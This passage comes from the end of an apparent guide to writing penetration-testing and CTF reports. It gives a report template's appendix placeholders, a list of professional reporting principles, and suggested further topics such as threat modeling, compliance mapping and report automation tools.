[Nmap scans, Nessus reports - attached separately]

### Appendix B: Testing Methodology Details
[Detailed testing procedures]

### Appendix C: Tool Configurations
[Tool settings and parameters used]

### Appendix D: Glossary of Terms
[Technical term definitions for non-technical audiences]

### Appendix E: Legal Disclaimer
[Standard legal language]

---

END OF REPORT
```

---

**Critical Reporting Principles for CTF and Professional Success:**

1. **Accuracy**: Every finding must be verified and reproducible
2. **Clarity**: Technical details balanced with business context
3. **Actionability**: Recommendations must be specific and implementable
4. **Prioritization**: Risk-based ordering helps resource allocation
5. **Evidence**: Screenshots, logs, and PoCs support credibility
6. **Professionalism**: Clear formatting, proper grammar, consistent style

**Important Subtopics for Advanced Study:**

- **Threat Modeling** (STRIDE, DREAD frameworks)
- **Metrics and KPIs** (Security program measurement)
- **Compliance Mapping** (NIST, ISO 27001, CIS Controls)
- **Presentation Skills** (Delivering findings to stakeholders)
- **Report Automation** (Tools like Dradis, PlexTrac, Faraday)
